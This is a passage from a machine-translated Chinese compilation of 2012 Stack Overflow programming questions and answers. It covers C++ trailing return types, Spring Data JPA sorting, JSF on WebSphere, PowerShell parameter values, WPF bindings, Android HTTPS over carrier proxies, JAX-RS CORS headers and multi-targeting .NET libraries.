这是我在 clang (svn-3.2) 和 VC++11 中编译的确切代码（因为我在 Windows 上使用 clang，所以我不能`#include <iostream>`）

```
#include <cmath>

template<typename X> class A {
  X a;
public:
  A(X x) : a(x) {}
  template<typename Y>
  auto diff(A<Y> const&y) const -> decltype(a-y.a)
  { return a-y.a; }
};

template<typename X, typename Y>
inline auto dist(A<X> const&x, A<Y> const&y) -> decltype(std::abs(x.diff(y)))
{ return std::abs(x.diff(y)); }

int main()
{
  A<double> x(2.0), y(4.5);
  return (int) dist(x,y);
} 
```

此代码导致[gcc 4.5 上的构建错误](http://ideone.com/2CtBE)与您描述的类似。

更换

```
auto diff(A<Y> const&y) const -> decltype(a-y.a) 
```

和

```
auto diff(A<Y> const&y) const -> typename std::common_type<X,Y>::type 
```

导致代码[在 gcc 4.5 上运行](http://ideone.com/La4mT)。

这向我表明了一个错误，即 gcc 未能将尾随返回类型视为在类的范围内。[一些测试表明](http://ideone.com/NpF0F)尾随返回类型必须在模板函数上才能触发错误。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-06-15T14:45:13.920

您的代码有错误：

```
template<typename Y>
  auto diff(A<Y> const&y) const -> decltype(a-y.a)
  { return a-y.a; } 
```

这里，`A<Y>`是不同的类型，所以`A<X>`看不到它的`a`数据成员。只能`A<Y>`看到`A<Y>::a`。

**编辑**：也就是说，在您的特定情况下，`X`and `Y`are both `double`，所以我天真地期望它能够编译。请注意，在最好的情况下，这种构造应该只在`X`和`Y`相同时编译，这可能不是您想要的。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-15T14:46:19.677

您的函数在语句中从类外部`auto diff(A<Y> const& y)`访问`private`变量。`A::a``decltype`

如果您想以您在函数中的方式使用它，您`A::a`应该这样做。`public``diff`

编辑：似乎友谊解决方案更适合这个问题，然后将其公开。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-06-15T14:53:56.523

`auto diff(A<Y> const&y) const -> decltype(a-y.a)`是问题；不管别的，if`X`和`Y`是不同的类型，`A<X>`并且`A<Y>`是不同的类型，不能偷看对方的隐私。模板不是协变的！

这里的具体错误可能是 GCC 的怪癖（因为它没有发现`X`与`Y`输入你的 diff 函数？）将永远不会工作，无论编译器如何。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-15T15:37:12.993

正如我现在已经弄清楚的那样（另请参阅问题的编辑）问题是什么。事实证明，所有答案（到目前为止）都没有解决（完整）问题。

本质上，对`decltype`全局函数的表达式求值最终需要私有成员`A<X>::a`（通过它出现在 的`decltype`表达式中`A<x>::diff()`）。这就提出了下一个问题，即标准对此有何规定。

# hibernate - Spring-data JPA 存储库通过在结果中丢失空值来排序

> ID：11052843
> 
> 赞同：5
> 
> 时间：2012-06-15T14:38:25.463
> 
> 标签：hibernate, jpa, spring-data-jpa

我正在使用 spring-data 和 jpa 存储库进行查询。我有一个问题，我有一个带有 ManyToOne 字段的实体，如果我在查询中按此字段排序，那么我的列表中不会返回该字段为 Null 的任何值。这似乎不是正确的行为。

这是我的实体的样子：

```
@Entity
public class Item {
@Id
@GeneratedValue(strategy = GenerationType.IDENTITY)
@Basic(optional = false)
@NotNull
@Column(name = "id")
private Integer id;

@Size(max = 255)
@Column(name = "name")
private String name;

@JoinColumn(name = "owner_user_id", referencedColumnName = "id")
@ManyToOne(fetch = FetchType.LAZY)
private User ownerUserId;

} 
```

然后是 ManyToOne 用户实体

```
@Entity
public class User {

@Size(max = 100)
@Column(name = "email")
private String email;
@Size(max = 256)
@Column(name = "first_name")
private String firstName;
@Id
@GeneratedValue(strategy = GenerationType.IDENTITY)
@Basic(optional = false)
@NotNull
@Column(name = "id")
private Integer id;

@OneToMany(cascade = CascadeType.ALL, mappedBy = "ownerUserId", fetch = FetchType.LAZY)
private Collection<Item> itemCollection;

} 
```

我有这样的 JPA 存储库：

```
@Transactional
public interface ItemRepository extends JpaRepository<Item, Integer> {

 @Query("FROM Item i where name = ?1");
 Page<Item> findItemWithName(String name, Pageable pageable);
} 
```

我已经简化了很多代码，只是为了让您有所了解。所有查询都运行良好，当我在 Pageable 对象中设置 Sort 以对 owner_user_id 列进行排序时，问题就出现了。如果 item 表中的任何条目的 owner_user_id 为 null，则它们不会在列表中返回。

我可以添加某种注释来解决这个问题吗？或者我还能做些什么？我真的很想继续使用存储库，但如果我无法解决这个问题，我认为我不会。我正在使用休眠和 MYSQL，不确定这是否是问题的一部分。

谢谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-28T13:39:45.223

这是 Spring Data / JPA Spec 中的一个已知问题，已在 1.2.1 版本中解决。请参阅[https://jira.springsource.org/browse/DATAJPA-252](https://jira.springsource.org/browse/DATAJPA-252)和[https://jira.spring.io/browse/DATAJPA-277](https://jira.spring.io/browse/DATAJPA-277)。

# jsf - JSF 应用程序无法在 Websphere Application Sever 7 中启动

> ID：11052853
> 
> 赞同：0
> 
> 时间：2012-06-15T14:39:06.443
> 
> 标签：jsf, websphere, jsf-1.2, websphere-7

在 WAS 控制台中启动我的应用程序时遇到问题。该应用程序是一个简单的 Hello World JSF servlet。

我正在使用 Websphere Application Server 版本 7.0.0.9。

带有 facelets 1.1.14 的 JSF 1.2

当我尝试启动应用程序时，我在日志中收到以下错误。知道如何解决这个问题吗？

```
[15/06/12 15:13:49:747 BST] 00000045 config        I   Initializing Sun's JavaServer Faces implementation (1.2_07-b03-FCS) for context '/JsfServletDeployTest'
[15/06/12 15:13:49:756 BST] 00000045 webapp        E com.ibm.ws.webcontainer.webapp.WebApp notifyServletContextCreated SRVE0283E: Exception caught while initializing context: {0}
                                 java.lang.NoClassDefFoundError: com.sun.faces.config.DbfFactory (initialization failure)
    at java.lang.J9VMInternals.initialize(J9VMInternals.java:140)
    at com.sun.faces.config.ConfigManager.getConfigDocuments(ConfigManager.java:276)
    at com.sun.faces.config.ConfigManager.initialize(ConfigManager.java:202)
    at com.sun.faces.config.ConfigureListener.contextInitialized(ConfigureListener.java:175)
    at com.ibm.ws.webcontainer.webapp.WebApp.notifyServletContextCreated(WebApp.java:1678) 
```

再往下，异常如下：

```
[15/06/12 15:13:49:771 BST] 00000045 servlet       E com.ibm.ws.webcontainer.servlet.ServletWrapper init SRVE0100E: Uncaught init() exception created by servlet Faces Servlet in application JsfServletDeployTest_war: java.lang.IllegalStateException: Application was not properly initialized at startup, could not find Factory: javax.faces.context.FacesContextFactory
    at javax.faces.FactoryFinder.getFactory(FactoryFinder.java:270)
    at javax.faces.webapp.FacesServlet.init(FacesServlet.java:164)
    at com.ibm.ws.cache.servlet.ServletWrapper.init(ServletWrapper.java:238)
    at com.ibm.ws.webcontainer.servlet.ServletWrapper.init(ServletWrapper.java:358) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T11:06:08.437

我也遇到了同样的问题，我想我也得到了答案......

似乎当您的服务器已经在 WPS 7.0 上没有 JSF(1.2) 应用程序的情况下启动时，它不会在类加载器中加载 SUN-JSF 类。

因此，如果您只是使用 JSF 1.2 部署 portlet 应用程序，它将无法开始工作并且无法找到类，因为该类应该由服务器引导程序加载。

现在，当您部署了该应用程序并重新启动服务器时，它会在初始化 JSF1.2 应用程序时加载所需的 SUN-JSF 库。因此，当您单击 portlet 时，它会加载 portlet。

因此，基本上您需要在部署 portlet 后重新启动服务器。但这应该只适用于第一个 JSF 1.2 应用程序。

希望这可以帮助。

//生命值

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-21T22:47:19.043

我遇到了同样的问题，调试后发现类路径中缺少“myfaces-api.jar”和“myfaces-impl.jar”。包括它们后，应用程序正常启动，没有任何错误。检查它是否适用于您。

# sql-server - 对 SQL Server 2008 的只读访问权限

> ID：11052854
> 
> 赞同：-1
> 
> 时间：2012-06-15T14:39:08.883
> 
> 标签：sql-server, entity-framework, nhibernate, linq-to-nhibernate

我需要给业务分析师一个 web 工具来查询 SQL Server 生产数据库中的行数据（我知道这不是一个好主意，但大老板这么说......）。如何确保它们只能运行 SQL SELECT 或 LINQ 选择，但不能修改任何内容？我最初的计划是创建一个具有只读权限的用户，但事实证明 DBA 正在休假一个月......

所以为了更清楚 - 我正在寻找一种方法来创建 ASP.NET 页面，该页面将公开给定数据库中的所有表以供读取，但不能写入。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T14:58:22.753

*   在网络服务器上构建查询。
*   创建一个新的 sql 实例并复制数据。
*   将数据导出到其他东西。

可能还有更多选择，一个带有实时数据副本的新 sql 实例将是您最好的选择。

如果是我，尽管我只是告诉“Big Boss”，dba 正在度假，而您没有对数据库进行更改所需的权限。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-15T14:48:44.900

[好像您正在寻找具有只读访问权限](http://msdn.microsoft.com/en-us/library/cc837196%28v=vs.90%29.aspx)的 ASP.NET 动态数据网站。

# google-app-engine - 将应用版本设为默认版本时在 Google App Engine 上收到通知

> ID：11052855
> 
> 赞同：2
> 
> 时间：2012-06-15T14:39:09.830
> 
> 标签：google-app-engine, screen-scraping, web-scraping

**背景**

我想设置一个系统，每当应用程序版本在 Google App Engine 的管理控制台上成为默认版本时通知团队成员。原因是在版本更改为默认版本时让所有开发人员保持更新。并且此通知不应被开发人员抑制，以确保不会错过任何通知。

当我向 Google 支持人员询问任何此类通知时，他们说不存在，并在功能请求 #4260111 中添加了一个建议，以提供监控 API。

在特定应用程序的 Google App Engine 管理控制台中，有一个名为 Admin Logs 的部分。管理员日志可以通过事件“Verson Made Default”进行过滤，以获取每次应用程序版本在生产中成为默认版本时的日志行。这些日志不能被抑制，这对我的目的有好处。

这是日志行的样子。

```
日期 管理员事件结果
2012-06-14 12:30:51 a@example.com 设置默认版本version=123.timestamp

```

这些日志行可用的 URL 具有以下形式：

```
http://appengine.google.com/adminlogs?app_id=s%7Esome_app_id&type=version_made_default&limit=20 
```

对 SO 上类似问题的回复表明，目前唯一的解决方案是在上面的 URL 处抓取页面。参考：[https ://stackoverflow.com/a/8084798/888759](https://stackoverflow.com/a/8084798/888759)

**问题：**

要在上面的 URL 上查看管理员日志，管理员必须登录。如何在 Google App Engine 管理控制台登录墙后面抓取此页面？

抓取脚本如何通过 Google App Engine 的管理控制台进行身份验证？

非常感谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T15:01:13.303

一种解决方案可能是检查 HTTP 'Host' 标头。它最终*可能*来自`<appversion>.<appid>.appspot.com`to`<appid>.appspot.com`或您的自定义 DNS 主机名。

无论如何，我更喜欢 API 级别的东西。

# powershell - Powershell 获取变量选项

> ID：11052857
> 
> 赞同：1
> 
> 时间：2012-06-15T14:39:16.093
> 
> 标签：powershell

使用 powershell cmdlet 时，我经常发现我需要将开关设置为有限数量的选项，但我不知道这些选项是什么。我最终花了几个小时试图用谷歌搜索我想要的选项。有没有更好的办法？我试过查看 microsoft 站点和 Get-Help -examples，但这些都没有为我想要的开关提供值。

这是一个例子。

```
Set-SPWebApplication <a couple of switches...> -AuthenticationMethod <String> 
```

-AuthenticationMethod 的可接受值是什么？

这只是一个例子，但我经常遇到这个问题。我认为 Get-Help 中应该有一些东西可以照亮我，但这通常是无益的。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-15T14:43:14.833

我知道的最简单的方法是传递一个无效选项，然后您会在错误消息中得到一个列表：

> `PS> Set-ExecutionPolicy foo`
> 
> Set-ExecutionPolicy：无法绑定参数“ExecutionPolicy”。由于枚举值无效，无法将值“foo”转换为类型“Microsoft.PowerShell.ExecutionPolicy”。指定以下枚举值之一，然后重试。**可能的枚举值为“Unrestricted、RemoteSigned、AllSigned、Restricted、Default、Bypass、Undefined”。**
> 
> 在 line:1 char:20
> + Set-ExecutionPolicy <<<< foo
>     + CategoryInfo : InvalidArgument: (:) [Set-ExecutionPolicy], ParameterBindingException
>     + FullyQualifiedErrorId : CannotConvertArgumentNoMessage, Microsoft.PowerShell.Commands.SetExecutionPolicyCommand

此时您也有了类型，因此您还可以使用制表符完成来获取有效值：

> `PS> [Microsoft.PowerShell.ExecutionPolicy]::``Tab`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-15T14:46:03.523

无法测试`Set-SPWebApplication`但：

```
get-help  out-file -Parameter "encoding" 
```

给出参数的解释和可能值的列表。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-15T16:01:56.920

您可以将其与[Christian](https://stackoverflow.com/a/11052965/763026)的建议结合使用

```
(get-help out-file).syntax ## gives you the sytax 
```

之后使用[Christian 的版本](https://stackoverflow.com/a/11052965/763026)

```
get-help  out-file -Parameter "encoding" 
```

因此，您可以使用第一个查询来查看语法，然后使用第二个查询来了解语法的详细信息。您可以替换`out-file`为`Set-SPWebApplication`.

希望这可以帮助。

# wpf - 如何在没有路径的情况下在样式绑定中使用 IValueConverter 让每个控件在设计时分配路径？

> ID：11052858
> 
> 赞同：0
> 
> 时间：2012-06-15T14:39:17.187
> 
> 标签：wpf, binding, path, styles, ivalueconverter

我正在尝试创建一个将转换器附加到它的样式，以便当我使用这种样式时它会自动使用转换器。我遇到的问题是，如果我没有在样式中设置路径，编译器就会不喜欢它。我不想在样式中设置绑定的“路径”属性，因为我想在设计时选择路径。并非所有控件都会自动使用相同的路径名称。

这是我的例子：

```
<Style x:Key="SomeCustomTextBox" BasedOn="{StaticResource {x:Type TextBox}}" TargetType="{x:Type TextBox}">
    <Setter Property="Text">
        <Setter.Value>
            <Binding>
                <Binding.Path>SomePath</Binding.Path>
                <Binding.Converter>
                    <Converters:SomeIValueConverter/>
                </Binding.Converter>
            </Binding>
        </Setter.Value>
    </Setter>
</Style> 
```

此外，如果我在我的 xaml 代码的下一行（如下所示）中使用类似的样式，它会自动覆盖整个绑定，而不仅仅是绑定路径。

```
<TextBox Height="28" Name="someNameThatOveridesDefaultPath" Style="{StaticResource SomeCustomTextBox}" MaxLength="5" /> 
```

有可能以某种方式做这样的事情吗？

谢谢！帕特里克·米隆

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T14:56:07.347

尝试使用这样的附加属性

```
public class AttachedProperties
{
    public static readonly DependencyProperty RawTextProperty = DependencyProperty.RegisterAttached(
        "RawText",
        typeof(string),
        typeof(AttachedProperties));

    public static void SetRawText(UIElement element, string value)
    {
        element.SetValue(RawTextProperty, value);
    }

    public static string GetRawText(UIElement element)
    {
        return element.GetValue(RawTextProperty) as string;
    }
} 
```

然后在你的 XAML

```
<Style x:Key="SomeCustomTextBox" BasedOn="{StaticResource {x:Type TextBox}}" TargetType="{x:Type TextBox}">
    <Setter Property="Text" Value="{Binding RelativeSource={RelativeSource Mode=Self}, 
    Path=local:AttachedProperties.RawText, Converter=Converters:SomeIValueConverter}">
    </Setter>
</Style>

<Grid>
    <TextBox Style="{StaticResource SomeCustomTextBox}" 
                local:AttachedProperties.RawText="test text" />
</Grid> 
```

我还没有测试过代码，但这就是想法

# php - 为 CodeIgniter 生成安装脚本

> ID：11052867
> 
> 赞同：2
> 
> 时间：2012-06-15T14:39:51.123
> 
> 标签：php, sql, codeigniter

我用谷歌搜索过，我已经搜索过，但我找不到这个问题的答案。

我用框架 CodeIgniter 编写了一个相当大的应用程序。现在，它几乎准备好了，因此几乎可以发货了。

如何将它安装在我们的服务器或客户的服务器上？

我知道我可以为此编写一个安装程序，但我想，也许有人编写了一个安装程序生成器。或者至少可以生成一个可以添加 20-30 个表的脚本，这样我就不必花费一周的时间来构建安装程序。应用程序必须与 Oracle、MSSQL 和 MySQL 兼容。

如果有这样的东西可用，那就太棒了。

编辑：语法编辑：我使用活动记录类，因此它与所有数据库兼容。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-19T04:41:00.240

试试这个：[https ://github.com/mikecrittenden/codeigniter-installer](https://github.com/mikecrittenden/codeigniter-installer)

# php - 如何使用 api php facebook 获取图片的个人资料？

> ID：11052869
> 
> 赞同：0
> 
> 时间：2012-06-15T14:40:10.037
> 
> 标签：php, facebook, api, image

听到是我的代码。我想用 api php facebook 获取图片。变量 $photo 返回 NULL 值。

```
<?php
    $profile = $facebook->api('/<idfacebook>');
    $photo = $facebook->api('/'.$profile['username'].'/picture');
?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T14:48:48.760

来自stackoverflow.com/questions/2821061

“只需通过以下网址获取数据：http: [//graph.facebook.com/sarfraz.anees/picture](http://graph.facebook.com/sarfraz.anees/picture)

将 sarfraz.anees（我的名字）替换为您想要获取照片的用户名。您可以使用 PHP 的`file_get_contents`函数来读取该 url 并处理检索到的数据。

资源：`http://developers.facebook.com/docs/api`

注意：在 php.ini 中，您需要确保打开 openssl 扩展以使用`file_get_contents`PHP 的功能读取该 url。"

# css - 如何摆脱Firefox中下拉焦点的虚线边框

> ID：11052871
> 
> 赞同：0
> 
> 时间：2012-06-15T14:40:21.220
> 
> 标签：css, firefox

我已经尝试了从设置大纲：无到 -moz-outline-style：无；和轮廓颜色：#fff；我什至设置了边框：0，但它仍然显示在焦点上

有任何想法吗 ？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T14:46:01.780

我会尝试

```
outline:0; 
```

开始..

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-15T14:42:30.593

尝试：

```
select {
    -moz-outline-style: none;     
    outline-style: none;
    outline-width: 0px;
    outline-color: -moz-use-text-color;
    outline: 0;
} 
```

# jquery - 需要在 Firefox 中应用 webkit 样式，反之亦然

> ID：11052887
> 
> 赞同：0
> 
> 时间：2012-06-15T14:41:27.210
> 
> 标签：jquery, css, cross-browser

我有一些需要设置样式的文本，但它可以在多种类型的设备上运行。因此，以列数为例，我尝试这样做：

```
$columnDiv.css({
    '-moz-column-count': value,
    '-webkit-column-count': value,
    'column-count': value,
}); 
```

但它只会导致内联应用 -moz-column-count。不管浏览器如何，都可以将 jquery 放入其他的吗？在 Chrome 中，它只会应用 -webkit-column-count css 样式。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-13T11:47:06.067

jQuery 在这方面的工作方式是它知道您需要一个前缀版本。所以你只需要应用"column-count": 2，根据浏览器的不同，jQuery 会添加前缀版本。

因此，除非它实际上在任何设备上被破坏，否则您无需担心将所有前缀版本添加到 jQ 中的样式中。

# java - 某些 Android 设备的 3G 中的 HTTPS 异常

> ID：11052889
> 
> 赞同：3
> 
> 时间：2012-06-15T14:41:38.870
> 
> 标签：java, android, sockets, https, socketexception

这是我的问题：

我想使用自签名证书在我的服务器上发出 HTTPS 请求。使用 Galaxy S2 (v4.0.3)、Nexus S (4.0.4)、Xperia Ray (4.0.3) 和 Galaxy Ace (2.3.6) 在 WLAN 中运行良好。

在 3G 中测试时，它仅适用于 Galaxy Ace 和 Xperia Ray。在其他人身上，我得到了一个`Socket is closed: java.net.SocketException`.

在[此页面上](http://code.google.com/p/android/issues/detail?id=29509)，我找到了解决方案。我有一个请求属性`Connection : close`。但是没有这个标题，我会得到一个不同的错误：`Handshake timeout`.

这些设备有什么不同才能获得这些不同的结果？

对于 https 请求，我使用`javax.net.ssl`包。我使用客户端私钥进行请求。

**编辑**：我使用其他 SIM 卡进行了测试，这很奇怪：使用一张，它适用于 Nexus S，但不适用于 Galaxy S。第二张，适用于所有人。我的结论是：一些运营商可能会限制特定的请求或数据传输。我不知道为什么，我会联系他们以获取更多信息

**EDIT2：** 此处的解决方案： [如何强制我的应用不使用 3g 数据代理设置](https://stackoverflow.com/questions/9905521/how-to-force-my-app-not-to-use-the-3g-data-proxy-setting)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-27T10:39:56.773

根据您的编辑，此问题确实是由运营商代理设置引起的。

您的链接解决了我的问题，但花了一点时间弄清楚如何使用*ProxySelector*和 *Proxy.NO_PROXY*，所以我想我会在这里发布我的解决方案以确保完整性。

请注意，我将覆盖来自应用程序的所有 URI 尝试，如果您通过 Facebook SDK 之类的东西建立连接，并且不想自己破解，这将很方便。

```
ProxySelector proxySelector = new ProxySelector() {

        @Override
        public List<Proxy> select(URI uri) {
            List<Proxy> proxies = new ArrayList<Proxy>();
            proxies.add(Proxy.NO_PROXY);
            return proxies;
        }

        @Override
        public void connectFailed(URI uri, SocketAddress address,
                IOException failure) {
            // TODO Auto-generated method stub

        }
    };
    ProxySelector.setDefault(proxySelector); 
```

# forms - 使用 href 链接将表单发送到个人电子邮件

> ID：11052895
> 
> 赞同：0
> 
> 时间：2012-06-15T14:42:02.207
> 
> 标签：forms, href

我正在尝试使用 href 按钮设置表单。我一直在更改不同的内容并提交了几次表格，从 10 次开始我只收到了 1 封电子邮件。我知道它有效，但我的问题是为什么它有时只有效？这是我的代码：

```
'<form id="search-form1">
                <fieldset>
                    <div class="extra-wrap">
                        <div class="col-1">
                        <label><input type="text"  value="Your full name  (required) " onFocus="if(this.value=='Your full name  (required) '){this.value=''}" onBlur="if(this.value==''){this.value='Your full name  (required) '}" /></label>
                        <label><input type="text"  value="Your email address  (required)" onFocus="if(this.value=='Your email address  (required)'){this.value=''}" onBlur="if(this.value==''){this.value='Your email address  (required)'}" /></label>
                        <label><input type="text"  value="Subject" onFocus="if(this.value=='Subject'){this.value=''}" onBlur="if(this.value==''){this.value='Subject'}" /></label>
                        </div>
                        <div class="col-2">
                            <textarea onBlur="if(this.value=='') this.value='Your message'" onFocus="if(this.value =='Your message' ) this.value=''">Your message</textarea><br>
                            <img src="images/page1-img15.gif" alt="" class="img">
                            <label><input type="text" class="input1"  value="" onFocus="if(this.value==''){this.value=''}" onBlur="if(this.value==''){this.value=''}" />
                                   <a href="mailto:ramon.ramirez0831@gmail.com" class="link8" onclick="document.getElementById('search-form1').submit();return false">Send</a>
                            </label>

                        </div>
                   </div>
                </fieldset>
                    </form>' 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T16:02:01.327

您需要一个服务器端脚本来处理请求并发送邮件。请参阅**[PHP 的邮件功能](http://il.php.net/manual/en/book.mail.php)**。

# html - IE8 无法打印动态元素

> ID：11052896
> 
> 赞同：1
> 
> 时间：2012-06-15T14:42:09.007
> 
> 标签：html, css, internet-explorer, printing

任何人都知道为什么从页面的一部分克隆到另一部分的动态元素不会在 IE8 中打印？

例子：

```
// Content div for element to be cloned to
<div class="content"></div>

// Element to be cloned to .content
<p>Some Text</p>

// Final result after cloning
<div class="content"><p>Some Text</p></div> 
```

我正在使用 jQuery clone() 方法来克隆元素。

在此先感谢您的帮助！

更新：

我实际上在代码逻辑中缺少一个类。看来我正在寻找一个没有包含在 IE 中的类，因此正在打印的元素有一个 display:none。在这种情况下，逻辑未能达到预期，我们找到了问题的解决方案。

感谢大家的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T17:29:10.657

稍微拆分代码并再次创建相同的元素，将解决克隆元素的问题：

**HTML**

```
<div class="content"></div>
<p class="cloneMe">Some Text</p>​ 
```

**Javascript**

```
$(document).ready(function(){
    var p = $("<p class='cloneMe'>");
    p.html( $('p.cloneMe').html() );
    //p.clone().appendTo('.content'); // clone() no longer necessary
    p.appendTo('.content');
});​ 
```

**现场演示**：http: [//jsfiddle.net/4b9z3/3/](http://jsfiddle.net/4b9z3/3/)

**有关此的更多信息**：[IE 忽略动态加载内容的样式](https://stackoverflow.com/questions/7590537/ie-ignores-styles-for-dynamically-loaded-content/7590830#7590830)

# web-services - CDI 无法使用 @Context 注释检索 servlet 响应

> ID：11052897
> 
> 赞同：0
> 
> 时间：2012-06-15T14:42:21.873
> 
> 标签：web-services, jakarta-ee, dependency-injection, jax-rs, cdi

我有一个返回 json 的 jax-rs Web 服务，我想向它添加 cors 标头。

所以我有以下课程：

```
[...]
import javax.enterprise.context.RequestScoped;
import javax.servlet.http.HttpServletResponse;
import javax.ws.rs.Path;
[...]

@Stateful
@Path("/grupo")
@RequestScoped
@TransactionAttribute
public class GrupoEndpoint
{

   @Context
   private HttpServletResponse response;

    @GET
    public List<Grupo> listAll()
    {
        @SuppressWarnings("unchecked")
        final List<Grupo> results = em.createQuery("SELECT x FROM Grupo x").getResultList();
        // here response is null!!!
        response.addHeader("Access-Control-Allow-Origin", "*");
        response.addHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
        return results;
    } 
```

但是响应总是空的，我可能会遗漏什么吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T19:34:39.847

@Stateful 与 @RequestScoped 冲突。@RequestScoped 意味着为每个请求创建一个新的资源实例，而 @Stateful 将导致在请求之间共享同一个实例。如果@Stateful 优先，您正在尝试将请求范围的变量 (HttpServletRequest) 注入到单例范围的资源中，这可能不起作用。您可以尝试将其作为方法参数 ( ) 注入 listAll( `public List<Grupo> listAll(@Context HttpServletRequest request)`)。

但是无论如何，您都不应该通过 HttpServletResponse 添加标头-相反，您应该如下声明您的方法：

```
@GET
public Response listAll()
{
    @SuppressWarnings("unchecked")
    final List<Grupo> results = em.createQuery("SELECT x FROM Grupo x").getResultList();
    return Response.ok(new GenericEntity<List<Grupo>>(results) {})
            .header("Access-Control-Allow-Origin", "*")
            .header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
            .build();
} 
```

# joomla - 将 Joomla 2.5 与谷歌地图集成

> ID：11052901
> 
> 赞同：0
> 
> 时间：2012-06-15T14:42:34.500
> 
> 标签：joomla, joomla2.5

我是第一次使用 Joomla 2.5 的用户。我正在考虑将谷歌地图集成到我的网站中，其中登录用户可以“创建”他的路线信息并保存它，以便用户创建的所有路线都可以显示在地图页面中..有没有办法我可以做这是通过使用扩展或插件？

类似于 mapmyride 所做的事情。是否有任何知名的模块或扩展？

感谢您在这方面的任何帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T14:49:13.763

我们不久前看过几个很好的扩展，包括[SimpleRoute](http://extensions.joomla.org/extensions/maps-a-weather/maps-a-locations/map-directions/5569)或[Extensions library](http://extensions.joomla.org/extensions/maps-a-weather/maps-a-locations/map-directions)中的许多其他扩展。

# java - 如何使 slick2d 可调整大小

> ID：11052902
> 
> 赞同：0
> 
> 时间：2012-06-15T14:42:34.870
> 
> 标签：java, resize, window, slick2d

嘿伙计们，我想知道是否有一种方法可以让用户调整 slick2d 的大小。（我对此进行了研究，只发现了如何使程序在程序中调整大小）

这是我的代码，提前致谢。

```
package Main;
import States.Menu;
import States.Play;
import org.newdawn.slick.*;
import org.newdawn.slick.state.*;

/**
 *
 * @author Kyle
 */
public class Lawu extends StateBasedGame{

    public static final String gamename = "Lawu";
    public static final int menu = 0;
    public static final int play = 1;

    public static int height=600,width=760;

    public Lawu(String gamename)
    {
        super(gamename);
        this.addState(new Menu(menu));
        this.addState(new Play(play));
    }

    public static void main(String[] args) {
        AppGameContainer appgc;
        try{
            appgc = new AppGameContainer(new Lawu(gamename),width, height, false);
            appgc.start();
        }
        catch(SlickException e)
        {
            e.printStackTrace();
        }
    }

    public void initStatesList(GameContainer gc) throws SlickException {
        this.getState(menu).init(gc, this);
        this.getState(play).init(gc, this);
        gc.setIcon("res/Monster.png");
        this.enterState(menu);
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T21:33:37.467

把它放在*appgc.start()*之前：

```
appgc.setResizable(true); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-02-17T19:24:24.750

你必须使用`display.setResizable(boolean)`.

# .net - 如何创建类库版本以支持 .NET Framework 的多个版本？

> ID：11052908
> 
> 赞同：4
> 
> 时间：2012-06-15T14:42:53.750
> 
> 标签：.net, visual-studio-2010

我正在尝试编写一系列在组织内的多个应用程序之间使用的类库。其中一些应用程序以 .NET 3.5 为目标，一些以 4.0 为目标。

我们希望提供两个版本的程序集，一个面向 3.5，一个面向 4.0，以便主机应用程序可以选择最适合它们的程序集。

3.5 和 4.0 版本之间存在一些细微差别：

*   由于被 .NET 4.0 版本取代，一些类已被删除。
*   添加了一些类以帮助使用 .NET 4.0 引入的类。
*   一些类在 4.0 版本中进行了修改，以利用 4.0 中一些增强的线程支持。

是否有任何解决方案可以让我重新使用代码库的重叠部分并防止简单地分叉源树？

我的目标是生成针对其指定框架的程序集的多个版本，这些程序集可以滚动到 NuGet 包中并在我们的内部提要中公开。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-15T14:58:45.740

这听起来像是条件编译器指令的工作。

胡椒你的代码：

```
#If NET35
...
#End If 
```

和

```
#If NET40
...
#End If 
```

从这里开始，您必须将`NET35`和`NET40`编译常量添加到您的项目中，我建议您首先在配置管理器中创建自定义配置，例如`DebugNET35`、`DebugNET40`、`ReleaseNET35`和`ReleaseNET40`。创建这些配置后，您可以切换到每个配置并转到项目的高级编译选项，您可以在其中设置自定义常量`NET35`或`NET40`，具体取决于当前配置。

您也可以在此对话框中设置目标框架，但它将全局设置您的框架版本。要为每个配置设置自定义目标框架，请遵循[Pierre 的步骤](https://stackoverflow.com/a/4427532/1257753)。

之后，选择一个配置并编译！我已经使用这种技术为应用程序的“演示”和“完整”版本共享相同的代码库。

希望未来版本的 Visual Studio 将包含自动定义的框架版本：[https ://connect.microsoft.com/VisualStudio/feedback/details/113323/include-framework-version-defines-automatically](https://connect.microsoft.com/VisualStudio/feedback/details/113323/include-framework-version-defines-automatically)

**编辑：** .NET Framework 博客中有一篇新文章讨论了在 Visual Studio 2010 和 2012 中编写可移植代码库：http: [//blogs.msdn.com/b/dotnet/archive/2012/07/06/targeting-multiple -platforms-with-portable-code-overview.aspx](http://blogs.msdn.com/b/dotnet/archive/2012/07/06/targeting-multiple-platforms-with-portable-code-overview.aspx)，这看起来像一个更清洁的解决方案。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-15T14:55:36.193

可能有更好的方法来做到这一点，但我在针对不同平台时做了以下操作。（使用 XNA 的 Xbox 与 PC）

